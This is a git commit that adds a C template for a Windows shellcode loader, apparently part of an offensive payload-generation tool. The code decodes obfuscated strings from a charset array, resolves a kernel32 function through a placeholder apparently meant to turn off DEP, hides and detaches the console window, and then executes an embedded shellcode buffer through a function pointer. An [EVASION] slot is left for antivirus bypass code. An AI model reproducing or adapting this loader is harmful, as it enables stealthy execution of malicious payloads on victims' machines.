6e057e585d86b552e923a74da8a0a0ae6bfbe083
Mr.Un1k0d3r <mr.un1k0d3r@gmail.com>
2017-08-15 17:58:29 -0400

    Create template.c

---
+++ templates/template.c
@@ -0,0 +1,32 @@
+#define _WIN32_WINNT 0x0500
+#define VAR10 0x00000000
+#include <stdio.h>
+#include <Windows.h>
+
+VOID [FUNC_NAME](DWORD *VAR6, DWORD VAR7, CHAR **VAR8) {
+        CHAR VAR5[] = "[CHARSET_ARRAY]";
+        DWORD VAR9 = (VAR7 ^ VAR7) / VAR7;
+        *VAR8 = (CHAR*)GlobalAlloc(GPTR, VAR7 + 1);
+        for(VAR9; VAR9 < VAR7; VAR9++) {
+                sprintf(*VAR8, "%s%c", *VAR8, VAR5[VAR6[VAR9]]);
+        }
+}
+int main() {
+        [FUNC_ARRAY]
+        BOOL WINAPI(*VAR1)(DWORD);
+        VAR1 = GetProcAddress(LoadLibrary([KERNEL32]), [DEP]);
+        if(VAR1 != NULL) {
+                VAR1(VAR10);
+        }
+        char VAR2[] = "[RAND]";
+        ShowWindow(GetConsoleWindow(), SW_HIDE);
+        FreeConsole();
+        char VAR3[] = "[SHELLCODE]";
+
+		    [EVASION]
+		
+        int(*VAR4)(void);
+        VAR4 = (int(*)())VAR3;
+        VAR4();
+        return 0;
+}
